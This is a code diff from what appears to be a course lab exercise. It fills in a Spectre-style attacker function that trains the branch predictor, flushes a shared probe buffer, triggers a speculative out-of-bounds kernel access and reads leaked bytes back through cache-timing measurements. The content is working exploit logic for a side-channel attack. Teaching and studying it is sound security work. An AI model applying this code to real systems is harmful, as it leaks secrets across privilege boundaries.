@@ -47,55 +47,43 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 3]- Fill this in!
         // leaked_byte = ??
-        char leaked_byte = '?';
         const uint64_t CACHE_HIT_THRESHOLD = 80;
-        int counts[256] = {0};
-        const int max_attempts = 300; // Increased to improve reliability
+        const int NUM_TRIES           = 10;   // repeat each byte this many times
+        int histogram[256]            = {0};
 
-        // Step 0: Trigger TLB page walks
-        for (int i = 0; i < 256; i++) {
-            volatile char tmp = shared_memory[i * 4096];
-        }
-
-        for (int attempt = 0; attempt < max_attempts; attempt++) {
-            // Step 1: Train branch predictor
-            for (int train = 0; train < 100; train++) {
+        for (int attempt = 0; attempt < NUM_TRIES; attempt++) {
+            /* (1) Train the branch predictor: 30× with an in‐bounds offset (0) */
+            for (int train = 0; train < 30; train++) {
                 call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
-            // Step 2: Flush hot-path input to delay resolution
-            clflush(&shared_memory[0]);
-
-            // Step 3: Add delay to allow speculation to proceed
-            for (volatile int delay = 0; delay < 1000; delay++) {}
-
-            // Step 4: Flush shared memory side-channel pages
+            /* (2) Evict all 256 pages of the shared buffer from the cache */
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * 4096]);
             }
 
-            // Step 5: Trigger speculative load
+            /* (3) Trigger one out‐of‐bounds access – will be mispredicted speculatively */
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            // Step 6: Reload timing to detect leaked value
+            /* (4) Reload+Reload: time‐probe each page and count any cache hits */
             for (int i = 0; i < 256; i++) {
-                uint64_t access_time = time_access(&shared_memory[i * 4096]);
-                if (access_time < CACHE_HIT_THRESHOLD) {
-                    counts[i]++;
+                uint64_t t = time_access(&shared_memory[i * 4096]);
+                if (t < CACHE_HIT_THRESHOLD) {
+                    histogram[i]++;
                 }
             }
         }
 
-        // Step 7: Majority vote on result
-        int best_guess = -1, best_score = 0;
+        /* Pick the byte that “won” the vote */
+        int best_count = 0;
+        char leaked_byte = '?';   // fallback if we saw no hits at all
         for (int i = 0; i < 256; i++) {
-            if (counts[i] > best_score) {
-                best_score = counts[i];
-                best_guess = i;
+            if (histogram[i] > best_count) {
+                best_count = histogram[i];
+                leaked_byte = (char)i;
             }
         }
-
-        leaked_byte = best_guess;
+        
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
